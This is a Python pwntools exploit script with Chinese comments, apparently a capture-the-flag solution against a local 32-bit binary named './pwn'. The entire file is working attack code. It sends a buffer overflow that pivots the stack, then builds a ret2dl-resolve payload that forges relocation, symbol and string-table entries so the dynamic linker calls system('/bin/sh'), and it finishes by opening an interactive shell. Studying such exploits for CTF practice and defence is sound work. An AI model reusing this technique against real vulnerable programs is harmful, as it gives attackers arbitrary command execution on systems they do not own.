from pwn import *

# context.log_level = 'debug' # 调试时开启

name = "./pwn"
elf = ELF(name)
p = process(name)
# p = gdb.debug(name, "break *0x0804852b") # 如果需要 GDB 调试

# 基础地址设置
start = 0x804ae00
leave_ret_addr = 0x0804852b  # 根据你的代码
read_plt = elf.plt['read']

# --- Payload 1: Stack Pivot ---
# 目标是将栈劫持到 start - 20 的位置
# 结构: [Padding] + [Fake EBP] + [read] + [leave_ret] + [arg1] + [arg2] + [arg3]
payload1 = b"a"*40 + p32(start-20) + p32(read_plt) + p32(leave_ret_addr) + p32(0) + p32(start-20) + p32(0x100)
p.sendline(payload1)

# --- Payload 2: Ret2dl-resolve 构造 ---

# 获取各段地址
rel_plt_addr = elf.get_section_by_name('.rel.plt').header.sh_addr
dynsym_addr = elf.get_section_by_name('.dynsym').header.sh_addr
dynstr_addr = elf.get_section_by_name('.dynstr').header.sh_addr
resolve_plt = 0x8048380 # _dl_runtime_resolve 的 PLT 地址 (通常是 plt[0])

# 1. 确定 fake_rel_plt 的位置 (位于 start)
fake_rel_plt_addr = start

# 2. 计算 fake_dynsym 的对齐填充
# 我们需要: (fake_dynsym_addr - dynsym_addr) % 16 == 0
# 当前 fake_rel_plt 占用 8 字节
current_pos = fake_rel_plt_addr + 0x8 
align_bytes = (0x10 - ((current_pos - dynsym_addr) % 0x10)) % 0x10
fake_dynsym_addr = current_pos + align_bytes

# 3. 确定后续结构的位置
fake_dynstr_addr = fake_dynsym_addr + 0x10 # Sym 表项占 16 字节
bin_sh_addr = fake_dynstr_addr + 0x7       # "system\x00" 长度为 7

# 4. 计算关键索引 (Index)
reloc_index = fake_rel_plt_addr - rel_plt_addr
st_name = fake_dynstr_addr - dynstr_addr
# 符号表索引 = 偏移量 / 16。因为做了对齐，这里一定是整数
sym_index = (fake_dynsym_addr - dynsym_addr) // 0x10 
r_info = (sym_index << 8) + 0x7 # 0x7 是 R_386_JUMP_SLOT 类型

# 5. 构造伪造的数据结构
fake_rel_plt = p32(elf.got['read']) + p32(r_info)
fake_dynsym = p32(st_name) + p32(0) + p32(0) + p32(0x12000000)
fake_dynstr = b"system\x00/bin/sh\x00\x00"

# 6. 组合 Payload 2
# 结构: [New EBP] + [PLT_0] + [reloc_index] + [Ret_addr] + [Arg: /bin/sh] + [Structures...]
# 注意: 中间需要插入 align padding
payload2 = p32(0x0) + p32(resolve_plt) + p32(reloc_index) + b"XXXX" + p32(bin_sh_addr)
payload2 += fake_rel_plt
payload2 += b'A' * align_bytes  # 关键修复：插入对齐字节
payload2 += fake_dynsym
payload2 += fake_dynstr

# 确保 payload 长度足够读取，防止 read 截断 (可选)
payload2 = payload2.ljust(0x100, b'\x00')

p.sendline(payload2)
p.interactive()
